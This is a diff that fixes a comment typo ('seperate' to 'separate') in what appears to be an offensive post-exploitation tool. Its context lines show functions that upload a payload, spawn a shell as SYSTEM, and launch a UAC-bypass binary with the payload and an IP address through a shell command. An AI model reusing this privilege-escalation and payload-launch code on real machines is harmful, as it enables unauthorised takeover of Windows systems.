@@ -842,7 +842,7 @@ try:
                     # sleep 0.5 seconds
                     time.sleep(0.5)
 
-                    # this will spawn the shell in a seperate process thread as
+                    # this will spawn the shell in a separate process thread as
                     # SYSTEM
                     def getsystem(set_payload, ipaddr):
                         # generate a random string between 10 and 15 length
@@ -978,7 +978,7 @@ try:
                     # set payload
                     upload_file(set_payload)
 
-                    # this will spawn the shell in a seperate process thread
+                    # this will spawn the shell in a separate process thread
                     def launch_uac(bypassuac, set_payload, ipaddress):
                         subprocess.Popen(
                             "%s /c %s %s" % (bypassuac, set_payload, ipaddress), shell=True).wait()
